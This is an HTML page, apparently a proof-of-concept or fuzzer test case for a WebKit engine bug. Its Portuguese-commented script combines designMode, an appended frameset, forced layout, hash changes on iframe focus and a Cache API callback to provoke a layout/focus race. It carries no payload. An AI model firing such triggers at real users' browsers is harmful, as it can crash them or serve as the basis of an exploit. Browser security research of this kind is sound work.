<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <style>
    iframe {
      content: url();
      zoom: 0.01;
    }
  </style>
</head>
<body>
  <iframe id="i0"></iframe>

  <script>
    // 1. Aproximação do Caret Browsing via Seleção/Foco
    function enableCaretSimulation() {
      try {
        document.designMode = 'on';
      } catch (e) {}
    }

    // 2. Função auxiliar para forçar o recálculo imediato de Layout no WebKit
    function forceLayout() {
      if (document.body) {
        return document.body.offsetHeight + document.documentElement.scrollHeight;
      }
      return 0;
    }

    window.onload = () => {
      enableCaretSimulation();

      const i0 = document.getElementById('i0');

      // Manipulação da árvore DOM: adiciona um frameset ao documento
      document.documentElement.append(document.createElement('frameset'));
      forceLayout();

      // Hook de foco no iframe para disparar alteração de fragmento
      i0.onfocus = () => {
        location.hash = 'y';
        forceLayout();
      };

      location.hash = 'x';

      // Dispara a resolução assíncrona via Cache API para transferir o foco
      let s0 = document.createElement('script');
      s0.src = 'data:text/javascript,' + encodeURIComponent(`
        if (typeof caches !== 'undefined') {
          caches.has('a').then(() => {
            const frame = document.getElementById('i0');
            if (frame) {
              frame.focus();
              // Força sincronização de layout no frame
              try {
                if (frame.contentWindow) {
                  frame.contentWindow.document.body.offsetHeight;
                }
              } catch(e) {}
            }
          });
        }
      `);

      document.head.append(s0);
    };
  </script>
</body>
</html>
